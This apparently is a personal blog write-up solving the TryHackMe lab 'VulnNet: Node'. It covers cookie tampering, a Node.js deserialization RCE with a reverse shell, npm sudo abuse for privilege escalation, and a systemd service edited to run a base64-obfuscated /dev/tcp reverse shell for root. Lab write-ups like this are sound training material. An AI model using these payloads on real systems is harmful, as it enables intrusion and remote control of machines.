---
title: "VulnNet: Node"
date: 2025-03-13
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF VulnNet Node
categories: [TryHackMe, Easy]
tags: [linux, nodejs, rce]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>VulnNet: Node</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/vulnnetnode">https://tryhackme.com/room/vulnnetnode</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge VulnNet: Node.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- -Pn 10.10.177.255
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 06:22 EDT
  Nmap scan report for 10.10.177.255
  Host is up (0.042s latency).
  Not shown: 65534 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  8080/tcp open  http-proxy

  Nmap done: 1 IP address (1 host up) scanned in 27.52 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 8080 -Pn 10.10.177.255
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 06:23 EDT
  Nmap scan report for 10.10.177.255
  Host is up (0.038s latency).

  PORT     STATE SERVICE VERSION
  8080/tcp open  http    Node.js Express framework
  |_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds
```

From here I proceeded with port 8080.

## Port 8080 Analysis

While analyzing the source code of the website, I noticed that the login mechanism wasn't functioning. The interesting part I found was the base64-encoded session cookie. I modified it to `admin` and the website changed, as it can be seen in the screenshots below.
```bash
$ echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==" | base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
$ echo '{"username":"Admin","isGuest":false,"encoding": "utf-8"}' | base64              
eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNHdWVzdCI6ZmFsc2UsImVuY29kaW5nIjogInV0Zi04In0K
```

![Guest](/assets/img/tryhackme/Vulnnetnode/thm_vulnnetnode_1.jpg)

![Admin](/assets/img/tryhackme/Vulnnetnode/thm_vulnnetnode_2.jpg)

The website processes the content of the session cookie. I attempted to exploit this using a Node.js deserialization Remote Code Execution vulnerability. First, I created Node.js shell code using the script from this <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">GitHub</a>. I wrote a small JavaScript script and pasted the output from `nodejsshell.py` into it:
```JavaScript
var z = {
	rce: function(){ << shellcode here >> }
}

var serialize = require('node-serialize');
var serialized = serialize.serialize(y);
console.log(serialized)
```

After executing it using `node serialize.js`, I generated the serialized shell code. It's important to add `()` at the end of the string like this:
```bash
...10))}()"}
        ^^
```

After encoding it using `Base64`, the shell code was ready to be inserted into the request. When the shell code was executed on the Node.js server, I successfully received the reverse shell:
```bash
$ nc -lvnp 9001 
listening on [any] 9001 ...
connect to [attackerip] from (UNKNOWN) [10.10.240.14] 43352
Connected!
whoami
  www
id
  uid=1001(www) gid=1001(www) groups=1001(www)
```

## Privilege Escalation serv-manage

I needed to escalate my privileges to user `serv-manage`, because user `www` didn't have the permission to retrieve the user flag. I started by executing `sudo -l`, which gave me an interesting output:
```bash
www@vulnnet-node:~/VulnNet-Node$ sudo -l
#Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

After searching on <a href="https://gtfobins.github.io/gtfobins/npm/">GTFObins</a>, I found a way to exploit this. First, I needed a directory with write permissions:
```bash
www@vulnnet-node:~/VulnNet-Node$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  [...]
  /var/tmp/
  [...]
```

After executing GTFObins commands, I was able to retrieve the user flag:
```bash
www@vulnnet-node:~/VulnNet-Node$ cd /var/tmp/
www@vulnnet-node:/var/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
www@vulnnet-node:/var/tmp$ sudo -u serv-manage /usr/bin/npm -C /var/tmp/ --unsafe-perm i
$ id
  uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
serv-manage@vulnnet-node:~$ cat user.txt 
  THM{0[removed]1}
```

## Privilege Escalation root

I proceeded with `sudo -l` and got the following output:
```bash
serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

First, I analyzed the `vulnnet-auto.timer`, which I had permission to start. This called the `vulnnet-job.service`, which executed whatever was specified in `ExecStart`. 
```bash
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer 
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service 
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

I had permission to modify the `vulnnet-job.service` and inserted a reverse shell command. The Penelope default payloads worked very well for me:  
```bash
serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-job.service 
ExecStart=/bin/bash -c "echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvODk5OSAwPiYxICYK|base64 -d|bash"
```

After starting the `vulnnet-auto.timer` service, I received the reverse shell and was able to retrieve the root flag:
```bash
serv-manage@vulnnet-node:~$ sudo -u root /bin/systemctl start vulnnet-auto.timer

root@vulnnet-node:/# cd /root
root@vulnnet-node:/root# cat root.txt 
  THM{a[removed]9}
```

solved! :)